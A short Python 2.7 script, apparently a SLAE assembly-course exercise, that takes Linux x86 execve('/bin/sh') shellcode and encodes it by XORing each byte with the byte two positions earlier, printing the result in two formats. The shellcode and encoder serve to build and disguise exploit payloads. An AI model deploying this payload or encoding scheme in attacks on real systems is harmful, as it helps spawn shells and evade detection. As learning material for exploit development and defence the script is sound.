#!/usr/bin/python2.7
#Author:   SLAE-755

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
shellcode_len = len(shellcode)


print "[+] Shellcode length is: %d" % shellcode_len




encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

shellcode = bytearray(shellcode)
for i in range(shellcode_len) :
	# Coping Bytes 0 and 1
	if i == 0 or i==1:
		encoded += '\\x'
		encoded += '%02x' % (shellcode[i])
		encoded2 += '0x'
		encoded2 += '%02x,' %(shellcode[i])
	else:
		encoded += '\\x'
		encoded += '%02x' % (shellcode[i] ^ shellcode[i-2])
		encoded2 += '0x'
		encoded2 += '%02x,' %(shellcode[i] ^ shellcode[i-2])





print "[+] Encoded Format 1 is: %s" % encoded
print "[+] Encoded Format 2 is: %s" % encoded2

#print 'Len: %d' % len(bytearray(shellcode))
